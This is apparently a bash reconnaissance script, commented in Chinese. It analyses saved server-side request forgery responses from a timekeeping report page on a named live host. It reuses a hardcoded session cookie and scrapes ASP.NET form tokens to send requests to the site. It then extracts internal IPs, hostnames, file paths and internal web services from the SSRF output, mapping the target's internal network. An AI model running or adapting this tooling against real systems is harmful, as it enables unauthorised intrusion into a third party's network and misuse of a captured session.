#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 分析SSRF响应内容"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "[1] 分析127.0.0.1响应"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "ssrf_127_0_0_1.html" ]; then
    echo "  文件大小: $(wc -c < ssrf_127_0_0_1.html) bytes"
    echo ""
    echo "  响应内容:"
    cat "ssrf_127_0_0_1.html" | head -100
    echo ""
    echo "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "  关键信息提取:"
    
    # 提取路径
    echo "    尝试的路径:"
    grep -oE "Could not find.*path '[^']+'" "ssrf_127_0_0_1.html" | head -3
    
    # 提取IP/主机名
    echo ""
    echo "    发现的主机名/IP:"
    grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}|\\\\\\\\[A-Za-z0-9-]+" "ssrf_127_0_0_1.html" | head -10
    
    # 查找错误类型
    echo ""
    echo "    错误类型:"
    grep -i "exception\|error" "ssrf_127_0_0_1.html" | grep -v "<!--" | head -5
fi

echo ""
echo "[2] 对比正常响应和SSRF响应"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 获取一个正常响应作为基线
COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

echo "  获取正常基线..."
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o baseline_normal.html 2>&1

baseline_size=$(wc -c < baseline_normal.html)
echo "    正常响应: $baseline_size bytes"

if [ -f "ssrf_127_0_0_1.html" ]; then
    ssrf_size=$(wc -c < ssrf_127_0_0_1.html)
    echo "    SSRF响应: $ssrf_size bytes"
    echo "    差异: $((ssrf_size - baseline_size)) bytes"
    
    echo ""
    echo "  差异内容:"
    diff <(cat baseline_normal.html | head -50) <(cat ssrf_127_0_0_1.html | head -50) | head -30
fi

echo ""
echo "[3] 分析所有SSRF响应文件"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

for file in ssrf_*.html; do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        
        echo ""
        echo "  $file: $size bytes"
        
        # 检查是否有特殊内容
        if grep -qi "access.*denied\|unauthorized\|permission\|forbidden" "$file"; then
            echo "    🔥 权限拒绝（主机/服务存在！）"
        fi
        
        if grep -qi "network.*unreachable\|host.*not found\|timeout\|cannot.*connect" "$file"; then
            echo "    ❌ 网络不可达"
        fi
        
        if grep -qi "directory.*not.*found\|path.*not.*found" "$file"; then
            echo "    ⚠️  目录不存在"
        fi
        
        # 提取尝试访问的完整路径
        attempted_path=$(grep -oE "path '[^']+'" "$file" | head -1 | cut -d"'" -f2)
        if [ -n "$attempted_path" ]; then
            echo "    尝试路径: $attempted_path"
        fi
    fi
done

echo ""
echo "[4] HTTP服务探测结果分析"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

for file in ssrf_service_*.html; do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        
        if [ $size -ne 7958 ] && [ $size -ne $baseline_size ]; then
            echo ""
            echo "  $file: $size bytes"
            
            # 查找服务特征
            if grep -qi "IIS\|Microsoft" "$file"; then
                echo "    🔥 IIS服务"
            fi
            
            if grep -qi "Apache" "$file"; then
                echo "    🔥 Apache服务"
            fi
            
            if grep -qi "nginx" "$file"; then
                echo "    🔥 Nginx服务"
            fi
            
            # 提取title
            title=$(grep -oE "<title>[^<]+</title>" "$file" | sed 's/<[^>]*>//g')
            if [ -n "$title" ]; then
                echo "    标题: $title"
            fi
        fi
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 分析完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
